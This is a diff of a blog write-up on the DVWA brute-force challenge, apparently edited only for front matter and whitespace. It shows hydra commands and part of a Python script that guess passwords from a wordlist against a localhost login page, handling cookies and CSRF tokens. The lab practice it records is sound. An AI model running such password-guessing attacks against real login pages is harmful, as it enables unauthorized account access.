@@ -4,55 +4,26 @@ description: ""
 summary: "The goal is to brute force an HTTP login page."
 date: 2022-08-17
 draft: false
-author: "Aftab Sama" # ["Me", "You"] # multiple authors
 tags: ["writeup", "challenge", "DVWA", "Brute Force"]
-canonicalURL: ""
-showToc: true
-TocOpen: false
-TocSide: 'right'  # or 'left'
-weight: 1
-# aliases: ["/first"]
-hidemeta: false
-comments: true
-disableHLJS: true # to disable highlightjs
-disableShare: true
-hideSummary: false
-searchHidden: false
-ShowReadingTime: true
-ShowBreadCrumbs: true
-ShowPostNavLinks: true
-ShowWordCount: true
-ShowRssButtonInSectionTermList: true
-# UseHugoToc: true
-# cover:
-#     image: "<image path/url>" # image path/url
-#     alt: "<alt text>" # alt text
-#     caption: "<text>" # display caption under cover
-#     relative: false # when using page bundles set this to true
-#     hidden: true # only hide on current single page
-# editPost:
-#     URL: "https://github.com/"
-#     Text: "Suggest Changes" # edit text
-#     appendFilePath: true # to append file path to Edit link
 ---
 
 The goal is to brute force an HTTP login page.
 
 ### **Security level: low**
 
-On submitting the username and password we see that it is using get request 
+On submitting the username and password we see that it is using get request
 
 ![Challenge page](images/185153021-af373095-102b-4d68-88c7-573499351bc5.webp)
 So let’s use hydra for brute force:
 
-``` 
+```
 hydra -l admin -P /usr/share/wordlists/rockyou.txt 127.0.0.1 http-get-form "/vulnerabilities/brute/:username=^USER^&password=^PASS^&Login=Login:Username and/or password incorrect.:H=Cookie: security=low; PHPSESSID=rt5o26sooph0v8p5nuarofj346"
 ```
 
 Here we are using cookies because if we are not authenticated when we make the login attempts, we will be redirected to default login page.
 
 Output:
-  
+
 ```Shell
 ┌─[aftab@parrot]─[~/Downloads/dvwa]
 └──╼ $hydra -l admin -P /usr/share/wordlists/rockyou.txt 127.0.0.1 http-get-form "/vulnerabilities/brute/:username=^USER^&password=^PASS^&Login=Login:Username and/or password incorrect.:H=Cookie: security=low; PHPSESSID=rt5o26sooph0v8p5nuarofj346"
@@ -88,7 +59,7 @@ it still work but this time attack takes significantly longer then before.
 on analyzing the login functionality we notice that the response is delayed by 2 or 3 seconds on wrong attempt.
 
 Output:
-  
+
 ```Shell
 ┌─[aftab@parrot]─[~/Downloads/dvwa]
 └──╼ $hydra -l admin -P /usr/share/wordlists/rockyou.txt 'http-get-form://127.0.0.1/vulnerabilities/brute/:username=^USER^&password=^PASS^&Login=Login:S=Welcome:H=Cookie\: PHPSESSID=j422143437vlsdgqs0t1385420; security=medium'
@@ -114,7 +85,7 @@ It's still get request but this time one additional parameter `user_token`
 It's using CSRF token so hydra wont help, let's use python this time.
 
 Python code:
-  
+
 ```python
 import requests
 from bs4 import BeautifulSoup
@@ -130,7 +101,7 @@ r = requests.get(url, headers=headers)
 r1 = r.content
 soup = BeautifulSoup(r1, 'html.parser')
 user_token = soup.findAll('input', attrs={'name': 'user_token'})[0]['value']
-  
+
 with open("/usr/share/wordlists/rockyou.txt", 'rb') as f:
     for i in f.readlines():
         i = i[:-1]
@@ -156,7 +127,7 @@ Output:
 
 ```Shell
 ┌─[aftab@parrot]─[~/Downloads/dvwa]
-└──╼ $python brute_high.py 
+└──╼ $python brute_high.py
 checking 123456
 checking 12345
 checking 123456789
